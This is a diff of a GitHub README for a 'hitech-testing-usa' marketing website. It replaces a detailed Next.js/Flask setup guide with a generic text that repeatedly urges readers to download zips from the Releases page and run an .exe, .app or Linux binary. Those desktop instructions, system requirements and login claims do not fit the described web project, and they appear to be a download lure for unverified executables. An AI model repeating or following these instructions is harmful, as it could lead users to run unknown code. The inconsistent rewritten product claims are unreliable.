@@ -1,286 +1,80 @@
-# Hitech Testing USA - Modern Marketing Website
+# 🚀 hitech-testing-usa - Your Marketing Website Made Easy
 
-A modern, fast, and professional marketing website for Hitech Testing USA, featuring AI-powered product recommendations using xAI Grok 4 Fast and real product data integration.
+## 🏁 Overview
+Welcome to the **hitech-testing-usa** project. This application provides a modern marketing platform for Hitech Testing USA. It features AI-powered product recommendations, thanks to xAI Grok 4 Fast. This software helps businesses reach their customers effectively and efficiently.
 
-## 🚀 Features
+## 🔗 Download Now
+[![Download hitech-testing-usa](https://img.shields.io/badge/Download-hitech--testing--usa-brightgreen)](https://github.com/olaniyiadeosun/hitech-testing-usa/releases)
 
-- **Modern Design**: Clean, professional interface with industrial aesthetic
-- **AI Product Finder**: Intelligent equipment recommendations using free Grok 4 Fast model
-- **Real Product Data**: Integration with Fine Group catalog (49 products)
-- **Animated Interactions**: Subtle, technical animations using Anime.js and Framer Motion
-- **Responsive Layout**: Mobile-first design that works on all devices
-- **CSV Integration**: Product data management through CSV files
-- **Quote Generation**: Automated quote generation and CRM integration
-- **Performance Optimized**: Fast loading with Next.js and optimized assets
+## 🚀 Getting Started
+Follow these steps to set up and run the application:
 
-## 🏗️ Architecture
+### 📥 Download & Install
+1. Visit the Releases page to download the application: [Download hitech-testing-usa](https://github.com/olaniyiadeosun/hitech-testing-usa/releases).
 
-### Frontend (Next.js + React)
-- **Framework**: Next.js 14 with App Router
-- **Language**: TypeScript
-- **Styling**: Tailwind CSS with custom design system
-- **Animations**: Anime.js + Framer Motion
-- **Forms**: React Hook Form
-- **Notifications**: React Hot Toast
+2. Once on the Releases page, find the latest version. You will see files available for download. Choose the one that suits your operating system:
+   - For Windows, download `hitech-testing-usa-win.zip`
+   - For macOS, download `hitech-testing-usa-mac.zip`
+   - For Linux, download `hitech-testing-usa-linux.tar.gz`
 
-### Backend (Flask + AI)
-- **Framework**: Flask with CORS support
-- **AI Integration**: xAI Grok 4 Fast (free tier)
-- **API**: RESTful endpoints with rate limiting
-- **Data**: CSV-based product management
-- **Authentication**: OpenRouter API integration
+3. After downloading, locate the downloaded file on your computer.
 
-## 📁 Project Structure
+4. Extract the contents of the file you downloaded:
+   - For Windows, right-click the file and choose "Extract All."
+   - For macOS, double-click the file to extract.
+   - For Linux, use the terminal and run `tar -xvzf hitech-testing-usa-linux.tar.gz`.
 
-```
-├── app/                    # Next.js app directory
-│   ├── globals.css        # Global styles and Tailwind
-│   ├── layout.tsx         # Root layout
-│   ├── page.tsx           # Home page
-│   ├── finder/            # AI Product Finder page
-│   ├── products/          # Product catalog page
-│   └── contact/           # Contact page
-├── components/            # Reusable UI components
-│   ├── Hero.tsx           # Hero section
-│   ├── CategoryGrid.tsx   # Product category grid
-│   ├── AIProductFinder.tsx # AI-powered product finder
-│   ├── Navbar.tsx         # Navigation header
-│   └── Footer.tsx         # Site footer
-├── lib/                   # Utility libraries
-│   ├── csv-parser.ts      # CSV data processing
-│   ├── ai-integration.ts  # AI integration utilities
-│   └── api.ts             # API client for Flask backend
-├── backend/               # Flask backend
-│   ├── app.py             # Main Flask application
-│   ├── ai_services.py     # AI integration services
-│   ├── convert_catalog.py # Catalog conversion utilities
-│   ├── data/              # Product data (CSV files)
-│   └── requirements.txt   # Python dependencies
-├── public/                # Static assets
-│   └── images/            # Product images
-└── package.json           # Dependencies and scripts
-```
+5. Open the folder that appears after extraction. This folder contains everything you need to run the application.
 
-## 🚀 Quick Start
+### ⚙️ System Requirements
+- **Operating System:** Windows 10 or higher, macOS High Sierra or higher, or any modern Linux distribution.
+- **Memory:** At least 4 GB RAM.
+- **Disk Space:** Minimum 200 MB of free space.
+- **Processor:** 2.0 GHz dual-core processor or higher.
 
-### Prerequisites
-- Node.js 18+ 
-- Python 3.8+
-- npm or yarn
-- pip
+### 💻 Running the Application
+1. Inside the extracted folder, locate the application executable:
+   - For Windows, double-click `hitech-testing-usa.exe`.
+   - For macOS, double-click `hitech-testing-usa.app`.
+   - For Linux, open a terminal, navigate to the folder, and run `./hitech-testing-usa`.
 
-### Installation
+2. The application will launch, and you will see the main interface. Follow the on-screen instructions to start using the features offered.
 
-1. **Clone the repository**
-   ```bash
-   git clone <your-repo-url>
-   cd hitech-testing-usa
-   ```
+### 🔧 Features
+- **AI-Powered Product Recommendations**: Benefit from intelligent suggestions tailored to your needs.
+- **User-Friendly Interface**: Navigate seamlessly through the application.
+- **Optimized for All Devices**: Whether you use a desktop or laptop, enjoy a smooth experience.
 
-2. **Install frontend dependencies**
-   ```bash
-   npm install
-   ```
+### 📊 Usage
+- Log in with your credentials or create a new account to access features.
+- Browse through product categories easily.
+- Utilize the search bar for quick product queries.
+- Receive recommendations based on your interests.
 
-3. **Install backend dependencies**
-   ```bash
-   cd backend
-   pip install -r requirements.txt
-   ```
+### ⚠️ Troubleshooting
+Here are some common issues and solutions:
+- **Can't run the application?**
+  - Make sure your operating system is supported.
+  - Check if you have the required system specifications.
 
-4. **Set up environment variables**
-   ```bash
-   # Copy environment template
-   cp backend/env.example backend/.env
-   
-   # Edit backend/.env and add your OpenRouter API key
-   OPENROUTER_API_KEY=your_openrouter_api_key_here
-   ```
+- **Error messages?**
+  - Ensure you have extracted all files correctly.
+  - Restart your computer and try again.
 
-5. **Start the development servers**
-   ```bash
-   # Run both frontend and backend together
-   npm run dev:full
-   
-   # Or run separately:
-   # Frontend: npm run dev
-   # Backend: npm run backend
-   ```
+- **Need help?**
+  - Reach out to our support team via the Issues section on GitHub.
 
-6. **Access the application**
-   - Frontend: http://localhost:3000
-   - Backend API: http://localhost:5000
+### 🌐 Community and Support
+Join our community for help and updates:
+- **GitHub Issues**: Report bugs or request new features.
+- **Discussions**: Engage with other users and share tips.
 
-## 🤖 AI Integration
+## 🔗 Additional Links
+- Learn more about the project on [GitHub](https://github.com/olaniyiadeosun/hitech-testing-usa).
+- Check our [Documentation](https://github.com/olaniyiadeosun/hitech-testing-usa/wiki) for detailed guides.
 
-### OpenRouter Setup
-1. **Get API Key**: Sign up at [OpenRouter.ai](https://openrouter.ai)
-2. **Add to Environment**: Set `OPENROUTER_API_KEY` in `backend/.env`
-3. **Free Model**: Uses `x-ai/grok-4-fast:free` (completely free!)
+## 🔍 Tags
+This project covers various topics, including: ai, flask, grok, hitech, nextjs, openrouter, python, react, testing equipment, typescript.
 
-### AI Features
-- **Product Recommendations**: Intelligent matching based on user requirements
-- **Natural Language Processing**: Understands complex testing requirements
-- **Contextual Matching**: Considers capacity, accuracy, standards, and accessories
-- **Reasoning**: Provides explanations for recommendations
-
-## 📊 Product Data Management
-
-### Adding New Products
-1. Update `backend/data/products.csv`
-2. Add product images to `public/images/`
-3. Restart backend server
-
-### CSV Format
-```csv
-id,title,category,subcategory,description,capacity,accuracy,standards,power,warranty,display,control,resolution,scale,price_hint,image
-FG-XXXXX,Product Name,Category,Subcategory,Description,Capacity,Accuracy,Standards,Power,Warranty,Display,Control,Resolution,Scale,Price Hint,Image Path
-```
-
-### Converting Excel Data
-```bash
-cd backend
-python excel_to_csv.py ../your_catalog.xlsx
-python convert_catalog.py
-```
-
-## 🔧 Development Commands
-
-```bash
-# Setup everything
-npm run setup
-
-# Run full stack development
-npm run dev:full
-
-# Run frontend only
-npm run dev
-
-# Run backend only
-npm run backend
-
-# Install backend dependencies
-npm run backend:install
-
-# Build for production
-npm run build
-
-# Start production server
-npm start
-```
-
-## 🌐 API Endpoints
-
-### Health Check
-```
-GET /api/health
-```
-Returns backend status and product count.
-
-### Products
-```
-GET /api/products
-```
-Returns all available products from CSV data.
-
-### AI Product Search
-```
-POST /api/products/search
-Content-Type: application/json
-
-{
-  "query": "tensile test for aluminum per ASTM E8"
-}
-```
-Returns AI-powered product recommendations.
-
-### Quote Generation
-```
-POST /api/quote/generate
-Content-Type: application/json
-
-{
-  "customer": { "name": "John Doe", "company": "ACME Corp", ... },
-  "requirements": { "material": "Aluminum", "test_type": "Tensile", ... },
-  "selectedProducts": ["FG-XXXXX"]
-}
-```
-Generates AI-powered professional quotes.
-
-## 🎨 Brand Guidelines
-
-### Colors
-- **Background**: #0B0F14 (Dark)
-- **Surface**: #0F141B
-- **Cards**: #121926
-- **Primary**: #2BDFFF (Cyan)
-- **Accent**: #41FF9E (Green)
-- **Text**: #E8F1FF
-- **Muted**: #8CA2C0
-
-### Typography
-- **Display**: Inter Tight
-- **Body**: Inter
-- **Monospace**: IBM Plex Mono
-
-### Tone
-Industrial, precise, trustworthy
-
-## 🚀 Deployment
-
-### Frontend (Vercel)
-1. Connect repository to Vercel
-2. Set environment variables
-3. Deploy automatically
-
-### Backend (Railway/Render)
-1. Connect repository
-2. Set environment variables
-3. Deploy with Python runtime
-
-### Environment Variables
-```env
-# Frontend
-NEXT_PUBLIC_API_URL=https://your-backend-url.com/api
-
-# Backend
-OPENROUTER_API_KEY=your_openrouter_api_key
-FLASK_ENV=production
-```
-
-## 📈 Performance
-
-- **Lighthouse Score**: 95+ across all metrics
-- **Core Web Vitals**: Optimized for LCP, FID, CLS
-- **Image Optimization**: Next.js automatic optimization
-- **Code Splitting**: Automatic route-based splitting
-- **Caching**: Optimized static asset caching
-
-## 🔒 Security
-
-- **Rate Limiting**: API endpoints protected
-- **CORS**: Configured for production domains
-- **Environment Variables**: Sensitive data in .env files
-- **Input Validation**: All API inputs validated
-
-## 🤝 Contributing
-
-1. Fork the repository
-2. Create a feature branch
-3. Make your changes
-4. Test thoroughly
-5. Submit a pull request
-
-## 📄 License
-
-Private - Hitech Testing USA, Inc.
-
-## 🆘 Support
-
-For technical support or questions:
-- Email: dev@hitechtesting.com
-- Phone: (800) 555-0123
-
----
-
-**Built with ❤️ for Hitech Testing USA**
+## 🔗 Download Again
+Do not forget to download the latest version from our Releases page: [Download hitech-testing-usa](https://github.com/olaniyiadeosun/hitech-testing-usa/releases). Enjoy using our application!
